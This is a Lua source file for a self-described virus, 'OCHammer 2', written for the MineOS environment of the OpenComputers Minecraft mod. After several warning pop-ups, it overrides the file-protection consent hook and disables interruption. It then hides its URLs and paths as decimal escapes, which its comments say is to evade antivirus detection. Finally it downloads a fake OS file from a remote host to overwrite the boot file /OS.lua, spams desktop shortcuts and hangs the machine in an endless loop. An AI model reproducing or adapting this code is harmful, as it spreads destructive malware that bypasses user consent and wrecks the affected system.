
-- Import libraries
local GUI = require("GUI")
local system = require("System")
local paths = require("Paths")
local com = require("Component")
local event = require("event")
local fs = require("Filesystem")
local internet = require("Internet")

local wait = event.sleep

-- OCHammer 2 virus
-- Copyright (c) 2022-2022 ocboy3

-- Why did Carl the NPC want to get the freaking gun?

-- Prevent Antivirus from detecting Boot file string by obfuscation

-- Prevent File Protector Beta from prompting user for consent via _G.fileprotect

function fp() _G.fileprotect = function(...) return true end end

-- Disable interruption so some dude can't delete this
event.interruptingEnabled = false

GUI.alert("NOTE: After Jul 10, 2025,\nOCHammer 2 will no longer be supported. Probably")

GUI.alert("\84\104\105\115\32\115\111\102\116\119\97\114\101\32\40\79\67\72\97\109\109\101\114\32\50\41\32\105\115\32\99\111\110\115\105\100\101\114\101\100\32\97\32\118\105\114\117\115\46\92\110\73\102\32\121\111\117\32\119\105\115\104\32\116\111\32\99\111\110\116\105\110\117\101\44\32\112\108\101\97\115\101\32\112\114\101\115\115\32\79\75\46\92\110\79\116\104\101\114\119\105\115\101\44\32\112\108\101\97\115\101\32\114\101\98\111\111\116\32\116\104\101\32\99\111\109\112\117\116\101\114\32\98\121\92\110\117\115\105\110\103\32\116\104\101\32\112\111\119\101\114\32\98\117\116\116\111\110\46")
GUI.alert("\65\114\101\32\121\111\117\32\115\117\114\101\63\92\110\73\102\32\121\101\115\44\32\116\104\101\110\32\112\108\101\97\115\101\32\112\114\101\115\115\32\79\75\46\92\110\79\116\104\101\114\119\105\115\101\44\32\112\108\101\97\115\101\32\114\101\98\111\111\116\32\116\104\101\32\99\111\109\112\117\116\101\114\32\98\121\92\110\117\115\105\110\103\32\116\104\101\32\112\111\119\101\114\32\98\117\116\116\111\110\46")
GUI.alert("\65\82\69\32\89\79\85\32\83\85\82\69\63\32\65\70\84\69\82\32\89\79\85\32\67\76\73\67\75\32\79\75\44\32\84\72\69\82\69\32\73\83\32\78\79\32\71\79\73\78\71\32\66\65\67\75\46\92\110\89\79\85\82\32\79\80\69\78\67\79\77\80\85\84\69\82\32\87\73\76\76\32\66\69\32\87\82\69\67\75\69\68\32\73\70\32\89\79\85\32\67\79\78\84\73\78\85\69")

function sadness()

  local cdir = fs.path(system.getCurrentScript())

  fp()
  internet.download("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\111\99\98\111\121\51\47\79\67\47\109\97\105\110\47\79\67\72\97\109\109\101\114\50\46\97\112\112\47\70\97\107\101\79\83\46\108\117\97","\47\79\83\46\108\117\97")
  
  fp()
  local IS_OS_DIR = fs.isDirectory("\47\77\105\110\101\79\83\47")
  
  if IS_OS_DIR == false then
    fp()
    fs.makeDirectory("\47\77\105\110\101\79\83\47")
  end
  
  fp()
  internet.download("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\111\99\98\111\121\51\47\79\67\47\109\97\105\110\47\79\67\72\97\109\109\101\114\50\46\97\112\112\47\80\76\69\65\83\69\37\50\48\82\69\65\68\37\50\48\77\69\46\116\120\116","\47\77\105\110\101\79\83\47\80\76\69\65\83\69\95\82\69\65\68\95\77\69\46\116\120\116") --  %20 = space

  -- spam a bunch of icons on the desktop
  for i = 1,30 do
    fp()
    system.createShortcut(paths.user.desktop .. "\80\76\69\65\83\69\95\82\69\65\68\95\77\69" .. tostring(i),"\47\77\105\110\101\79\83\47\80\76\69\65\83\69\95\82\69\65\68\95\77\69\46\116\120\116")
  end

  -- update the file list
  
  
  GUI.alert("WARNING PUTIN IS EVIL\nDO NOT PARTICIPATE IN ANY MILITARY OPERATION IN\nRUSSIA OR BELARUS.  THEY ARE DRAFTING EVERYONE\nFOR WAR. YOU HAVE BEEN WARNED.")

  event.push("system","updateFileList")

  while true do
    local deadline = os.time()+1

    repeat
      computer.pullSignal(0.1)
    until os.time() >= deadline

  end
end

sadness()
